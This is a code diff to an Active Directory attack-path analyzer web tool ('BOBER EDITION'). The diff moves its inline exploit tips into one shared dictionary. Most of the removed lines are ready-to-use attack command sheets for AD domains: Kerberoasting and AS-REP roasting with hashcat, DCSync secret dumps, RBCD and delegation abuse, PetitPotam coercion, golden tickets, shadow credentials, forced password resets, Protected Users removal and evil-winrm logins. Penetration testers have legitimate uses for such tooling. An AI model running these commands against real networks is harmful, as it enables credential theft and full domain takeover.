-  -impersonate Administrator \\
-  -altservice 'cifs/DC.domain.local' \\
-  domain/delegating_user:Pass -dc-ip DC_IP
-export KRB5CCNAME=Administrator@cifs_DC.ccache
-impacket-secretsdump -k -no-pass -just-dc-ntlm domain/Administrator@dc.domain.local</pre>
-      </div>` : ''}
+      ${t2a4d ? formatTip('AllowedToDelegate', G_EDGE_TIPS.AllowedToDelegate) : ''}
     </div>`;
   }
 
@@ -1581,28 +2101,7 @@ impacket-secretsdump -k -no-pass -just-dc-ntlm domain/Administrator@dc.domain.lo
     html += `<div class="sec" style="margin-top:18px">
       <div class="sec-title" style="color:var(--yellow)">⚡ Pre-Windows 2000 Compatible Access <span class="cnt warn">${S.graph.pre2k.length}</span></div>
       <div class="pre2k-list">${pills}</div>
-      <div class="chain-tip" style="margin-top:11px">
-        <span class="tip-label">// EXPLOIT — DEFAULT PASSWORD SPRAY</span>
-        <div style="color:var(--dim2);margin:4px 0 2px"># If logonCount=0 -> password = lowercase hostname (e.g. WEB01$ -> web01)</div>
-        <pre>
-# 1. Spray tool (TrustedSec pre2k):
-pre2k auth -u user -p Pass -dc-ip DC_IP -d domain.local
-
-# 2. nxc module:
-nxc ldap DC_IP -u user -p Pass -M pre2k
-
-# 3. Manual spray (user=WEB01$, pass=web01):
-nxc smb DC_IP -u computers.txt -p passwords.txt --no-bruteforce
-
-# 4. Password change -> TGT:
-rpcchangepwd.py -no-pass 'domain.local/MACHINE$:machine' DC_IP
-impacket-getTGT domain.local/'MACHINE$' -no-pass -dc-ip DC_IP
-
-# 5. Use the TGT for GMSA dump / further abuse:
-export KRB5CCNAME=MACHINE.ccache
-nxc ldap DC_IP -k --gmsa</pre>
-        <div class="tip-src"><a href="https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers" target="_blank">thehacker.recipes/pre-windows-2000</a></div>
-      </div>
+      ${formatTip('Pre2KCompatible', G_EDGE_TIPS.Pre2KCompatible)}
     </div>`;
   }
 
@@ -1615,19 +2114,7 @@ nxc ldap DC_IP -k --gmsa</pre>
     html += `<div class="sec" style="margin-top:18px">
       <div class="sec-title">🎫 Kerberoastable Accounts <span class="cnt warn">${kerberoastable.length}</span></div>
       <div class="pre2k-list">${pills}</div>
-      <div class="chain-tip" style="margin-top:11px">
-        <span class="tip-label">// EXPLOIT — KERBEROAST</span>
-        <pre>
-# Hash dump + cracking:
-impacket-GetUserSPNs domain.local/user:Pass -dc-ip DC_IP -request -outputfile kerberoast.txt
-nxc ldap DC_IP -u user -p Pass --kerberoasting kerberoast.txt
-
-# RC4 (faster cracking, etype 23):
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r best64.rule
-# AES256 (etype 18):
-hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt</pre>
-        <div class="tip-src"><a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" target="_blank">thehacker.recipes/kerberoast</a></div>
-      </div>
+      ${formatTip('Kerberoast', G_EDGE_TIPS.Kerberoast)}
     </div>`;
   }
 
@@ -1636,20 +2123,11 @@ hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt</pre>
     html += `<div class="sec" style="margin-top:18px">
       <div class="sec-title">👻 AS-REP Roastable Accounts <span class="cnt warn">${asrep.length}</span></div>
       <div class="pre2k-list">${pills}</div>
-      <div class="chain-tip" style="margin-top:11px">
-        <span class="tip-label">// EXPLOIT — AS-REP ROAST</span>
-        <pre>
-impacket-GetNPUsers domain.local/user:Pass -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
-nxc ldap DC_IP -u user -p Pass --asreproast asrep.txt
-
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r best64.rule</pre>
-        <div class="tip-src"><a href="https://www.thehacker.recipes/ad/movement/kerberos/asreproast" target="_blank">thehacker.recipes/asreproast</a></div>
-      </div>
+      ${formatTip('ASREProast', G_EDGE_TIPS.ASREProast)}
     </div>`;
   }
 
-  document.getElementById('content').innerHTML = `<div class="sec"><div class="sec-title">Kerberos Delegation & Roasting</div>${html}</div>`;
+  document.getElementById('content').innerHTML = `<div class="sec"><div class="sec-title">Insights & Attack Notes</div>${html}</div>`;
   postProcessPreBlocks(document.getElementById('content'));
 }
 
@@ -1673,17 +2151,7 @@ function renderDelegExtra() {
     extra += `<div class="sec" style="margin-top:18px">
       <div class="sec-title">🛡 Protected Users members <span class="cnt warn">${protectedUsers.length}</span></div>
       <div class="pre2k-list">${pills}</div>
-      <div class="chain-tip" style="margin-top:11px">
-        <span class="tip-label">// EXPLOIT — REMOVE FROM PROTECTED USERS GROUP</span>
-        <div style="color:var(--dim2);margin:4px 0 2px"># GenericAll / WriteDacl is required on the Protected Users group</div>
-        <pre>
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'Protected Users' --attr member</pre>
-        <pre>
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP remove groupMember 'Protected Users' TARGET</pre>
-        <pre>
-nxc ldap DC_IP -u USER -p PASS --groups | grep 'Protected'</pre>
-        <div class="tip-src"><a href="https://www.thehacker.recipes/ad/movement/dacl/addmember" target="_blank">thehacker.recipes/addmember</a></div>
-      </div>
+      ${formatTip('ProtectedGroup', G_EDGE_TIPS.ProtectedGroup)}
     </div>`;
   }
 
@@ -1694,23 +2162,22 @@ nxc ldap DC_IP -u USER -p PASS --groups | grep 'Protected'</pre>
     extra += `<div class="sec" style="margin-top:18px">
       <div class="sec-title">🖥 Remote Management Users members <span class="cnt">${winrmUsers.length}</span></div>
       <div class="pre2k-list">${pills}</div>
-      <div class="chain-tip" style="margin-top:11px">
-        <span class="tip-label">// EXPLOIT — WINRM LOGIN</span>
-        <div style="color:var(--dim2);margin:4px 0 2px"># evil-winrm (Ruby — recommended):</div>
-        <pre>
-evil-winrm -i DC_IP -u USER -p PASS</pre>
-        <pre>
-evil-winrm -i DC_IP -u USER -H NTLM_HASH</pre>
-        <div style="color:var(--dim2);margin:4px 0 2px"># evil-winrm.py (Python):</div>
-        <pre>
-python3 evil-winrm.py -i DC_IP -u USER -p PASS</pre>
-        <pre>
-python3 evil-winrm.py -i DC_IP -u USER -H NTLM_HASH</pre>
-        <div style="color:var(--dim2);margin:4px 0 2px"># nxc check:</div>
-        <pre>
-nxc winrm DC_IP -u USER -p PASS</pre>
-        <div class="tip-src"><a href="https://www.thehacker.recipes/ad/movement/winrm" target="_blank">thehacker.recipes/winrm</a></div>
-      </div>
+      ${formatTip('RemoteManagementUsers', G_EDGE_TIPS.RemoteManagementUsers)}
+    </div>`;
+  }
+
+  const rights = new Set((S.graph.raw_acls || []).map(a => a.right));
+  if (rights.has('DCSync')) {
+    extra += `<div class="sec" style="margin-top:18px">
+      <div class="sec-title">🎟 Golden Ticket note</div>
+      ${formatTip('GoldenTicket', G_EDGE_TIPS.GoldenTicket)}
+    </div>`;
+  }
+
+  if ((S.stats.computers || 0) > 0) {
+    extra += `<div class="sec" style="margin-top:18px">
+      <div class="sec-title">⏱ Timeroast note</div>
+      ${formatTip('Timeroast', G_EDGE_TIPS.Timeroast)}
     </div>`;
   }
 
@@ -2422,212 +2889,8 @@ function copyBlock(id) {
   });
 }
 
-// Edge tips — unified with ATTACK_TIPS
-const G_EDGE_TIPS = {
-  'ForceChangePassword': `bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
-# From Kerberos ccache:
-KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST set password TARGET 'NewPass123!'
-# net rpc:
-net rpc password TARGET 'NewPass123!' -U DOMAIN/USER%PASS -S DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword`,
-
-  'GenericAll': `# On a user - password reset:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
-# Shadow credentials (if AD CS is present):
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-# On a computer - RBCD:
-impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write DOMAIN/USER:PASS -dc-ip DC_IP
-# On a group:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember 'GROUP' USER
-SOURCE: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse`,
-
-  'GenericWrite': `# SPN write -> Kerberoast:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/spn'
-impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
-hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
-# Shadow Credentials:
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting`,
-
-  'WriteDacl': `impacket-dacledit -action write -rights FullControl -principal USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add dcsync USER
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/grant-rights`,
-
-  'WriteOwner': `# 1. Owner change:
-impacket-owneredit -action write -new-owner USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-# 2. WriteDacl → FullControl:
-impacket-dacledit -action write -rights FullControl -principal USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/grant-rights`,
-
-  'Owns': `impacket-owneredit -action write -new-owner USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-impacket-dacledit -action write -rights FullControl -principal USER -target TARGET DOMAIN/USER:PASS -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/grant-rights`,
-
-  'AddSelf': `bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember 'TARGET_GROUP' USER
-net rpc group addmem 'TARGET_GROUP' USER -U DOMAIN/USER%PASS -S DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/addself`,
-
-  'AddMember': `bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP add groupMember 'TARGET_GROUP' USER
-KRB5CCNAME=user.ccache bloodyAD -k -d DOMAIN --host DC_HOST add groupMember 'Domain Admins' USER
-net rpc group addmem 'TARGET_GROUP' USER -U DOMAIN/USER%PASS -S DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/addmember`,
-
-  'WriteSPN': `=== SPN-JACKING (constrained delegation + WriteSPN) ===
-# 1. Move the SPN to the target computer:
-addspn.py -u 'DOMAIN\USER' -p PASS -t 'TARGET$' --spn 'http/WEB01.DOMAIN' DC_IP
-# 2. S4U2Self + S4U2Proxy → altservice:
-impacket-getST -spn 'http/WEB01.DOMAIN' -impersonate Administrator -altservice 'cifs/DC_HOST' DOMAIN/USER:PASS -dc-ip DC_IP
-# 3. DCSync:
-export KRB5CCNAME=Administrator@cifs_DC.ccache
-impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/Administrator@DC_HOST -dc-ip DC_IP
-=== SIMPLE Kerberoast ===
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set object TARGET servicePrincipalName -v 'fake/spn'
-impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking`,
-
-  'ReadGMSAPassword': `nxc ldap DC_IP -u USER -p PASS --gmsa
-nxc ldap DC_IP -u USER -H NTLM_HASH --gmsa
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword
-python3 gMSADumper.py -u USER -p PASS -d DOMAIN -l DC_IP
-evil-winrm -i DC_IP -u 'GMSA_ACCOUNT$' -H NTLM_HASH
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword`,
-
-  'AddKeyCredentialLink': `# certipy (simpler, auto cleanup):
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-# pywhisker manually:
-pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action add --filename shadow_out
-python3 PKINITtools/gettgtpkinit.py -cert-pfx shadow_out.pfx -pfx-pass <pw> DOMAIN/TARGET TARGET.ccache
-python3 PKINITtools/getnthash.py -key <AS-REP-key> DOMAIN/TARGET
-# Cleanup:
-pywhisker -d DOMAIN -u USER -p PASS --target TARGET --action remove --device-id <ID>
-SOURCE: https://github.com/ShutdownRepo/pywhisker`,
-
-  'AllExtendedRights': `# Password reset:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP set password TARGET 'NewPass123!'
-# LAPS read (if computer):
-nxc ldap DC_IP -u USER -p PASS --laps
-# Shadow Credentials:
-certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP
-SOURCE: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse`,
-
-  'WriteAccountRestrictions': `=== RBCD ===
-# 1. Fake computer account:
-impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123!' DOMAIN/USER:PASS -dc-ip DC_IP
-# 2. Set RBCD:
-impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write DOMAIN/USER:PASS -dc-ip DC_IP
-# 3. S4U → ticket:
-impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator DOMAIN/'FAKE01$':FakePass123! -dc-ip DC_IP
-# 4. PTT → secretsdump:
-export KRB5CCNAME=Administrator@cifs_TARGET.ccache
-impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd`,
-
-  'DCSync': `impacket-secretsdump -just-dc-ntlm 'DOMAIN/USER:PASS'@DC_IP
-impacket-secretsdump -just-dc-ntlm -k -no-pass DOMAIN/Administrator@DC_HOST
-nxc smb DC_IP -u USER -p PASS --ntds
-impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc-user krbtgt
-SOURCE: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync`,
-
-  'GetChangesAll': `# GetChanges + GetChangesAll are required on the Domain object -> DCSync:
-impacket-secretsdump -just-dc-ntlm 'DOMAIN/USER:PASS'@DC_IP
-nxc smb DC_IP -u USER -p PASS --ntds
-SOURCE: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync`,
-
-  'GetChanges': `# Grants DCSync rights together with GetChangesAll:
-impacket-secretsdump -just-dc-ntlm 'DOMAIN/USER:PASS'@DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync`,
-
-  'ReadLAPSPassword': `nxc ldap DC_IP -u USER -p PASS --laps
-nxc ldap DC_IP -u USER -p PASS -M laps
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'COMPUTER$' --attr ms-MCS-AdmPwd
-evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/readlapspassword`,
-
-  'LAPSRead': `nxc ldap DC_IP -u USER -p PASS --laps
-nxc ldap DC_IP -u USER -p PASS -M laps
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'COMPUTER$' --attr ms-MCS-AdmPwd
-evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/readlapspassword`,
-
-  'MemberOf': `# Group membership - the principal inherits the group ACLs.
-# If the group has rights over an object, the member inherits them.
-# Check the group rights on the ACLs tab!`,
-
-  'AllowedToDelegate': `=== CONSTRAINED DELEGATION (T2A4D) ===
-impacket-getST -spn 'cifs/TARGET.DOMAIN' -impersonate Administrator -altservice 'cifs/DC_HOST' DOMAIN/USER:PASS -dc-ip DC_IP
-export KRB5CCNAME=Administrator@cifs_DC.ccache
-impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/Administrator@DC_HOST -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained`,
-
-  'Pre2KAbuse': `# logonCount=0 -> password = lowercase hostname (e.g. WEB01$ -> web01)
-nxc ldap DC_IP -u USER -p PASS -M pre2k
-pre2k auth -u USER -p PASS -dc-ip DC_IP -d DOMAIN
-rpcchangepwd.py -no-pass 'DOMAIN/MACHINE$:machine' DC_IP
-impacket-getTGT DOMAIN/'MACHINE$' -no-pass -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers`,
-
-  'Pre2KCompatible': `# logonCount=0 -> password = lowercase hostname (e.g. WEB01$ -> web01)
-nxc ldap DC_IP -u USER -p PASS -M pre2k
-pre2k auth -u USER -p PASS -dc-ip DC_IP -d DOMAIN
-rpcchangepwd.py -no-pass 'DOMAIN/MACHINE$:machine' DC_IP
-impacket-getTGT DOMAIN/'MACHINE$' -no-pass -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers`,
-
-  'Kerberoast': `impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
-nxc ldap DC_IP -u USER -p PASS --kerberoasting kerberoast.txt
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/kerberoast`,
-
-  'ASREProast': `impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
-nxc ldap DC_IP -u USER -p PASS --asreproast asrep.txt
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/asreproast`,
-
-  'UnconstrainedDelegation': `# 1. Coerce DC authentication:
-python3 PetitPotam.py -u USER -p PASS -d DOMAIN UNCONSTRAINED_HOST DC_IP
-coercer coerce -u USER -p PASS -d DOMAIN -l UNCONSTRAINED_HOST -t DC_IP
-# 2. Capture the TGT (Rubeus on the unconstrained host):
-Rubeus.exe monitor /interval:1 /nowrap
-# 3. PTT → DCSync:
-export KRB5CCNAME=DC01.ccache
-impacket-secretsdump -k -no-pass -just-dc-ntlm DOMAIN/DC01$@DC01.DOMAIN -dc-ip DC_IP
-SOURCE: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained`,
-
-  'GoldenTicket': `# 1. Domain SID:
-impacket-lookupsid DOMAIN/USER:PASS@DC_IP | grep 'Domain SID'
-# 2. Golden ticket:
-impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXX -domain DOMAIN Administrator
-# 3. Usage:
-export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass DOMAIN/Administrator@DC_HOST
-SOURCE: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket`,
-
-  'Timeroast': `python3 timeroast.py DC_IP -o timeroast_hashes.txt
-hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
-SOURCE: https://github.com/SecuraBV/Timeroast`,
-
-  'ProtectedGroup': `=== REMOVE FROM PROTECTED USERS GROUP ===
-# Check:
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP get object 'Protected Users' --attr member
-# Removal (requires GenericAll / WriteDacl):
-bloodyAD -u USER -p PASS -d DOMAIN --host DC_IP remove groupMember 'Protected Users' TARGET
-# Verify removal:
-nxc ldap DC_IP -u USER -p PASS --groups | grep 'Protected'
-SOURCE: https://www.thehacker.recipes/ad/movement/dacl/addmember`,
-
-  'RemoteManagementUsers': `=== WINRM LOGIN (Remote Management Users tag) ===
-# evil-winrm (Ruby — recommended):
-evil-winrm -i DC_IP -u USER -p PASS
-evil-winrm -i DC_IP -u USER -H NTLM_HASH
-# evil-winrm.py (Python):
-python3 evil-winrm.py -i DC_IP -u USER -p PASS
-python3 evil-winrm.py -i DC_IP -u USER -H NTLM_HASH
-# nxc check:
-nxc winrm DC_IP -u USER -p PASS
-SOURCE: https://www.thehacker.recipes/ad/movement/winrm`,
-
-};
+// Edge tips come from Python ATTACK_TIPS; keep the commands in one source.
+const G_EDGE_TIPS = {{ attack_tips | tojson }};
 
 function showLoading(msg) {
   document.getElementById('content').innerHTML = `<div class="loading"><div class="spinner"></div>${msg}</div>`;
@@ -2640,7 +2903,7 @@ function showLoading(msg) {
 if __name__ == '__main__':
     print("""
 +------------------------------------------------------+
-|  BOBER EDITION v1.3.0 -- Attack Path Analyzer  🦫     |
+|  BOBER EDITION v1.4.0 -- Attack Path Analyzer  🦫     |
 |  http://localhost:5000                               |
 |  Ctrl+C -> stop                                  |
 +------------------------------------------------------+
